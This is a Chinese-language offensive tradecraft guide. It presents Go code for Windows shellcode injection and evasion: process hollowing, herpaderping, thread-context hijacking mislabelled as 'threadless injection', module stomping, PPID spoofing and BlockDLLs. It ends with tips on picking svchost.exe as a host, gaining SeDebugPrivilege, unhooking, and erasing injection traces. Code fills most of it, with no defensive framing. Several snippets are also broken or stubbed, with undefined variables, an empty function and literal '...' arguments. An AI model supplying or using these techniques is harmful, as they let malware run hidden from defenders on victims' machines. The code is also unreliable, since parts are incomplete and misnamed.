# 进程操控(注入/镂空/伪装)

## 1. 进程镂空（Process Hollowing）

**原理：**
- 创建挂起进程
- 获取进程上下文
- 卸载主模块
- 分配新内存写入shellcode
- 修改上下文入口点
- 恢复执行

**Go实现：**
```go
func processHollowing(targetExe string, sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    
    CreateProcessW := kernel32.NewProc("CreateProcessW")
    GetThreadContext := kernel32.NewProc("GetThreadContext")
    NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    SetThreadContext := kernel32.NewProc("SetThreadContext")
    ResumeThread := kernel32.NewProc("ResumeThread")
    
    // 1. 创建挂起进程
    targetExePtr, _ := windows.UTF16PtrFromString(targetExe)
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    si.Size = uint32(unsafe.Sizeof(si))
    
    CreateProcessW.Call(0, uintptr(unsafe.Pointer(targetExePtr)), 0, 0, 0, 
        0x4, // CREATE_SUSPENDED
        0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
    
    // 2. 获取线程上下文
    var ctx CONTEXT
    ctx.ContextFlags = CONTEXT_FULL
    GetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
    
    // 3. 获取PEB中的ImageBaseAddress
    // 从ctx.Rdx读取PEB地址，再读取ImageBaseAddress
    
    // 4. 卸载主模块
    NtUnmapViewOfSection.Call(uintptr(pi.Process), imageBase)
    
    // 5. 分配新内存
    newBase, _, _ := VirtualAllocEx.Call(uintptr(pi.Process), imageBase, 
        uintptr(len(sc)), 0x1000|0x2000, 0x40)
    
    // 6. 写入shellcode
    WriteProcessMemory.Call(uintptr(pi.Process), newBase, 
        uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
    
    // 7. 修改上下文入口点
    ctx.Rip = newBase
    SetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
    
    // 8. 恢复执行
    ResumeThread.Call(uintptr(pi.Thread))
}
```

---

## 2. 幽灵注入（Ghost Injection）

**原理：**
- 创建空洞进程
- 无实际进程映像
- 特殊内存操作注入

**Go实现：**
```go
func ghostInjection(sc []byte) {
    // 创建特殊的空洞进程
    // 使用特殊的内存分配方式
}
```

---

## 3. Herpaderping

**原理：**
- 创建文件映射
- 映射到进程
- 删除文件
- 进程执行时文件不存在

**Go实现：**
```go
func herpaderping(targetPath string, sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    CreateFileW := kernel32.NewProc("CreateFileW")
    CreateFileMappingW := kernel32.NewProc("CreateFileMappingW")
    MapViewOfFile := kernel32.NewProc("MapViewOfFile")
    CreateProcessW := kernel32.NewProc("CreateProcessW")
    DeleteFileW := kernel32.NewProc("DeleteFileW")
    
    // 1. 创建文件并写入shellcode
    pathPtr, _ := windows.UTF16PtrFromString(targetPath)
    fileHandle, _, _ := CreateFileW.Call(uintptr(unsafe.Pointer(pathPtr)), 
        0x40000000, 0, 0, 2, 0, 0) // GENERIC_WRITE, CREATE_ALWAYS
    
    // 写入shellcode...
    
    // 2. 创建文件映射
    mapHandle, _, _ := CreateFileMappingW.Call(fileHandle, 0, 0x40, 0, 0, 0)
    
    // 3. 映射到当前进程
    mappedAddr, _, _ := MapViewOfFile.Call(uintptr(mapHandle), 0xF001F, 0, 0, 0)
    
    // 4. 创建进程执行映射的文件
    CreateProcessW.Call(...)
    
    // 5. 立即删除文件
    DeleteFileW.Call(uintptr(unsafe.Pointer(pathPtr)))
}
```

---

## 4. 无线程注入（Threadless Injection）

**原理：**
- 不创建新线程
- 修改现有线程上下文
- 设置入口点为shellcode

**Go实现：**
```go
func threadlessInjection(pid uint32, sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    OpenProcess := kernel32.NewProc("OpenProcess")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    OpenThread := kernel32.NewProc("OpenThread")
    SuspendThread := kernel32.NewProc("SuspendThread")
    GetThreadContext := kernel32.NewProc("GetThreadContext")
    SetThreadContext := kernel32.NewProc("SetThreadContext")
    ResumeThread := kernel32.NewProc("ResumeThread")
    
    // 1. 打开目标进程
    process, _, _ := OpenProcess.Call(0x1F0FFF, 0, uintptr(pid))
    
    // 2. 分配内存并写入shellcode
    remoteAddr, _, _ := VirtualAllocEx.Call(process, 0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
    WriteProcessMemory.Call(process, remoteAddr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
    
    // 3. 打开目标线程
    thread, _, _ := OpenThread.Call(0x1F0FFF, 0, uintptr(tid))
    
    // 4. 挂起线程
    SuspendThread.Call(thread)
    
    // 5. 获取并修改上下文
    var ctx CONTEXT
    ctx.ContextFlags = CONTEXT_FULL
    GetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))
    
    // 保存原始入口点
    originalRip := ctx.Rip
    ctx.Rip = remoteAddr
    
    // 6. 设置修改后的上下文
    SetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))
    
    // 7. 恢复线程执行shellcode
    ResumeThread.Call(thread)
}
```

---

## 5. 模块踩踏（Module Stomping）

**原理：**
- 获取已加载DLL地址
- 覆盖DLL代码段
- 执行覆盖后的代码

**Go实现：**
```go
func moduleStomping(pid uint32, dllName string, sc []byte) {
    // 打开目标进程
    process := openProcess(pid)
    
    // 获取目标DLL基址
    dllBase := getRemoteModuleBase(process, dllName)
    
    // 获取DLL代码段
    codeSection := getRemoteSection(process, dllBase, ".text")
    
    // 覆盖代码段
    writeRemoteMemory(process, dllBase + codeSection.VirtualAddress, sc)
    
    // 执行覆盖后的代码
}
```

---

## 6. PPID欺骗

**原理：**
- 设置PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
- 新进程继承指定父进程属性
- 伪装进程关系

**Go实现：**
```go
func ppidSpoofing(parentPid uint32, targetExe string, sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    OpenProcess := kernel32.NewProc("OpenProcess")
    InitializeProcThreadAttributeList := kernel32.NewProc("InitializeProcThreadAttributeList")
    UpdateProcThreadAttribute := kernel32.NewProc("UpdateProcThreadAttribute")
    CreateProcessW := kernel32.NewProc("CreateProcessW")
    
    // 1. 打开父进程
    parentProcess, _, _ := OpenProcess.Call(0x80000, // PROCESS_CREATE_PROCESS
        0, uintptr(parentPid))
    
    // 2. 初始化属性列表
    var size uintptr
    InitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&size)))
    
    attrList := make([]byte, size)
    InitializeProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])), 1, 0, uintptr(unsafe.Pointer(&size)))
    
    // 3. 设置父进程属性
    UpdateProcThreadAttribute.Call(uintptr(unsafe.Pointer(&attrList[0])), 0, 
        0x20000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
        parentProcess, uintptr(unsafe.Sizeof(parentProcess)), 0, 0)
    
    // 4. 创建进程
    var si windows.StartupInfoEx
    si.Size = uint32(unsafe.Sizeof(si))
    si.AttributeList = &attrList[0]
    
    CreateProcessW.Call(..., 0x80000, // EXTENDED_STARTUPINFO_PRESENT
        ...)
}
```

---

## 7. BlockDLLs

**原理：**
- PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
- 阻止非微软签名DLL加载

**Go实现：**
```go
func createProcessWithBlockDLLs(targetExe string) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    InitializeProcThreadAttributeList := kernel32.NewProc("InitializeProcThreadAttributeList")
    UpdateProcThreadAttribute := kernel32.NewProc("UpdateProcThreadAttribute")
    CreateProcessW := kernel32.NewProc("CreateProcessW")
    
    // 初始化属性列表
    // ...
    
    // 设置BlockDLLs策略
    policy := uintptr(0x10000000000000) // BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
    UpdateProcThreadAttribute.Call(attrList, 0, 
        0x20007, // PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
        uintptr(unsafe.Pointer(&policy)), uintptr(unsafe.Sizeof(policy)), 0, 0)
    
    // 创建进程
    CreateProcessW.Call(...)
}
```

---

## 常用进程访问权限

| 常量 | 值 | 说明 |
|------|-----|------|
| PROCESS_ALL_ACCESS | 0x1F0FFF | 完全访问 |
| PROCESS_CREATE_PROCESS | 0x80000 | 创建子进程 |
| PROCESS_CREATE_THREAD | 0x2 | 创建线程 |
| PROCESS_VM_OPERATION | 0x8 | 内存操作 |
| PROCESS_VM_READ | 0x10 | 读内存 |
| PROCESS_VM_WRITE | 0x20 | 写内存 |
| PROCESS_QUERY_INFORMATION | 0x400 | 查询信息 |

---

## 注意事项

1. **进程选择**：选择合法的宿主进程（如svchost.exe）
2. **权限提升**：可能需要SeDebugPrivilege
3. **脱钩处理**：目标进程可能也被Hook，需考虑脱钩
4. **清理痕迹**：完成后清理注入痕迹